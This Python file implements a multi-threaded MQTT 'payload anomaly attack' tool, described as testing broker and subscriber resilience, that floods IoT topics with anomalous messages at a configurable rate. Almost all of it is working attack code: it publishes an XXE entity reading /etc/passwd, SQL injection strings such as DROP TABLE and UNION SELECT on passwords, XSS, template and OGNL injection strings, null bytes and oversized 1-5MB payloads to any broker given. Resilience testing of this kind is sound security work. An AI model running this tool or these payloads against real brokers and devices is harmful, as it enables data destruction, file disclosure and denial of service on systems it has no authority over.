"""MQTT Payload Anomaly Attack - sends malformed or anomalous payloads to test broker/subscriber resilience."""

import argparse
import csv
import json
import os
import random
import string
import threading
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt


class PayloadAnomalyAttack:
    def __init__(self, args):
        self.args = args
        self.stop_event = threading.Event()
        self.log_writer, self.log_handle = self._prep_log(args.log_csv)
        self.log_lock = threading.Lock()
        self.sent_count = 0
        
        # Different types of anomalous payloads
        self.anomaly_types = [
            "oversized_payload",
            "malformed_json",
            "binary_data",
            "xml_injection",
            "sql_injection",
            "script_injection", 
            "null_bytes",
            "unicode_overflow",
            "control_chars",
            "schema_violation"
        ]

    @staticmethod
    def _prep_log(path):
        if not path:
            return None, None
        exists = os.path.exists(path)
        handle = open(path, "a", newline="", encoding="utf-8")
        writer = csv.writer(handle)
        if not exists:
            writer.writerow([
                "timestamp_utc", "client_id", "topic", "anomaly_type", 
                "payload_size", "status", "error_msg"
            ])
        return writer, handle

    def close(self):
        if self.log_handle:
            self.log_handle.flush()
            self.log_handle.close()

    def log_attack(self, client_id, topic, anomaly_type, payload_size, status, error_msg=""):
        if not self.log_writer:
            return
        with self.log_lock:
            self.log_writer.writerow([
                datetime.now(timezone.utc).isoformat(),
                client_id, topic, anomaly_type, payload_size, status, error_msg
            ])

    def generate_anomalous_payload(self, anomaly_type):
        """Generate different types of anomalous payloads"""
        
        if anomaly_type == "oversized_payload":
            # Generate extremely large payload (1MB+)
            size = random.randint(1024*1024, 5*1024*1024)  # 1-5MB
            return "A" * size
            
        elif anomaly_type == "malformed_json":
            # Various malformed JSON structures
            malformed_jsons = [
                '{"key": value}',  # missing quotes
                '{"key": "value",}',  # trailing comma
                '{"key": "value"',  # missing closing brace
                '{key: "value"}',  # unquoted key
                '{"key": "value" "key2": "value2"}',  # missing comma
                '{"key": undefined}',  # undefined value
                '{"": null, "": ""}',  # duplicate empty keys
            ]
            return random.choice(malformed_jsons)
            
        elif anomaly_type == "binary_data":
            # Random binary data
            return bytes([random.randint(0, 255) for _ in range(random.randint(100, 1000))])
            
        elif anomaly_type == "xml_injection":
            # XML/XXE injection attempts
            xml_payloads = [
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
                '<script>alert("XSS")</script>',
                '<!DOCTYPE html><html><body><img src=x onerror=alert(1)></body></html>',
            ]
            return random.choice(xml_payloads)
            
        elif anomaly_type == "sql_injection":
            # SQL injection payloads
            sql_payloads = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM passwords --",
                "'; INSERT INTO logs VALUES ('hacked'); --",
            ]
            return json.dumps({"value": random.choice(sql_payloads)})
            
        elif anomaly_type == "script_injection":
            # Script injection payloads
            script_payloads = [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "${7*7}",  # Template injection
                "{{7*7}}",  # Another template injection
                "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']}",
            ]
            return json.dumps({"data": random.choice(script_payloads)})
            
        elif anomaly_type == "null_bytes":
            # Null byte injection
            return f"normal_data\x00hidden_data_{random.randint(1, 1000)}"
            
        elif anomaly_type == "unicode_overflow":
            # Unicode overflow attempts
            unicode_chars = [
                "\u0000" * 1000,  # null chars
                "\uFFFF" * 500,   # max unicode
                "\u202E" + "normaltext",  # RTL override
                "A" * 65536 + "\u0041",  # buffer overflow attempt
            ]
            return random.choice(unicode_chars)
            
        elif anomaly_type == "control_chars":
            # Control character injection
            control_chars = [chr(i) for i in range(32)]  # ASCII control chars
            payload = "normal_text_"
            for _ in range(50):
                payload += random.choice(control_chars)
            return payload
            
        elif anomaly_type == "schema_violation":
            # Violate expected IoT data schemas
            violation_payloads = [
                {"temperature": "hot"},  # string instead of number
                {"humidity": -50},       # invalid range
                {"status": True, "temperature": [1,2,3]},  # wrong data types
                {"nested": {"deep": {"very": {"deep": "value"}}}},  # unexpected nesting
                {str(i): f"value{i}" for i in range(1000)},  # too many fields
            ]
            return json.dumps(random.choice(violation_payloads))
            
        return "default_anomaly_payload"

    def attack_worker(self, worker_id):
        """Worker thread for payload anomaly attack"""
        client_id = f"{self.args.client_prefix}_{worker_id:03d}"
        client = mqtt.Client(client_id=client_id, clean_session=True)
        
        if self.args.username:
            client.username_pw_set(self.args.username, self.args.password)

        # Connect to broker
        connected = False
        while not connected and not self.stop_event.is_set():
            try:
                client.connect(self.args.broker, self.args.port, self.args.keepalive)
                client.loop_start()
                connected = True
                print(f"[{client_id}] Connected to {self.args.broker}:{self.args.port}")
            except Exception as e:
                print(f"[{client_id}] Connection failed: {e}, retrying in 5s")
                time.sleep(5)

        if not connected:
            return

        # Attack loop
        attack_interval = 1.0 / self.args.attack_rate if self.args.attack_rate > 0 else 1.0
        
        try:
            while not self.stop_event.is_set():
                # Choose random anomaly type and topic
                anomaly_type = random.choice(self.anomaly_types)
                topic = random.choice(self.args.topics)
                
                # Generate anomalous payload
                try:
                    payload = self.generate_anomalous_payload(anomaly_type)
                    payload_size = len(str(payload)) if isinstance(payload, str) else len(payload)
                    
                    # Publish anomalous payload
                    result = client.publish(topic, payload, qos=self.args.qos)
                    
                    if result.rc == mqtt.MQTT_ERR_SUCCESS:
                        status = "sent"
                        self.sent_count += 1
                        if self.sent_count % 100 == 0:
                            print(f"[{client_id}] Sent {self.sent_count} anomalous payloads")
                    else:
                        status = "failed"
                        
                    self.log_attack(client_id, topic, anomaly_type, payload_size, status)
                    
                except Exception as e:
                    self.log_attack(client_id, topic, anomaly_type, 0, "error", str(e))
                    print(f"[{client_id}] Error generating/sending payload: {e}")
                
                time.sleep(attack_interval)
                
        except KeyboardInterrupt:
            pass
        finally:
            client.loop_stop()
            client.disconnect()
            print(f"[{client_id}] Disconnected")

    def run(self):
        """Start the payload anomaly attack"""
        print(f"Starting payload anomaly attack with {self.args.workers} workers")
        print(f"Target: {self.args.broker}:{self.args.port}")
        print(f"Topics: {self.args.topics}")
        print(f"Attack rate: {self.args.attack_rate} msgs/sec per worker")
        print(f"Anomaly types: {', '.join(self.anomaly_types)}")
        
        # Start worker threads
        threads = []
        for i in range(self.args.workers):
            thread = threading.Thread(target=self.attack_worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        try:
            # Keep main thread alive
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nStopping attack...")
            self.stop_event.set()
            
            # Wait for threads to finish
            for thread in threads:
                thread.join(timeout=5)
            
            print(f"Attack completed. Total anomalous payloads sent: {self.sent_count}")


def main():
    parser = argparse.ArgumentParser(description="MQTT Payload Anomaly Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker address")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--username", help="MQTT username")
    parser.add_argument("--password", help="MQTT password")
    parser.add_argument("--keepalive", type=int, default=60, help="Keepalive interval")
    parser.add_argument("--qos", type=int, choices=[0, 1, 2], default=0, help="QoS level")
    
    parser.add_argument("--topics", nargs="+", 
                       default=["iot/sensors/temp", "iot/sensors/humidity", "iot/actuators/fan"],
                       help="Target topics for anomaly attack")
    
    parser.add_argument("--workers", type=int, default=5, help="Number of attack workers")
    parser.add_argument("--attack-rate", type=float, default=2.0, 
                       help="Attack rate (anomalous messages per second per worker)")
    
    parser.add_argument("--client-prefix", default="anomaly_attacker", 
                       help="Client ID prefix")
    
    parser.add_argument("--log-csv", help="CSV file to log attack details")
    
    args = parser.parse_args()
    
    if not args.topics:
        print("Error: No target topics specified")
        return
    
    attack = PayloadAnomalyAttack(args)
    try:
        attack.run()
    finally:
        attack.close()


if __name__ == "__main__":
    main()